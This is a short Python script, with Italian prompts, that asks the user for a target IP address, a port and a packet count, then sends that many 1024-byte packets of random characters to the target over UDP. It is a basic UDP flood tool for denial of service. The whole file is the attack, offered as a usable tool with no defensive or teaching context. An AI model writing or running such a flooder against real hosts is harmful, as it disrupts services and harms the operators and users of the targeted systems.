import socket
import random

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&()*+,-_./:;<=>?@{|}~'

IP = input("Inserisci il target IP: ")
PORT = int(input("Inserisci la porta: "))

client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client_socket.connect((IP, PORT))
print ("Connesso!")

n_pacchetti = int(input("Inserisci il numero di pacchetti da inviare: "))
lunghezza_pacchetto = 1024

for sequenza in range(n_pacchetti):
    random_chars = ''.join(random.choices(chars, k=lunghezza_pacchetto))
    client_socket.sendto(random_chars.encode('utf-8'), (IP, PORT))

client_socket.close()
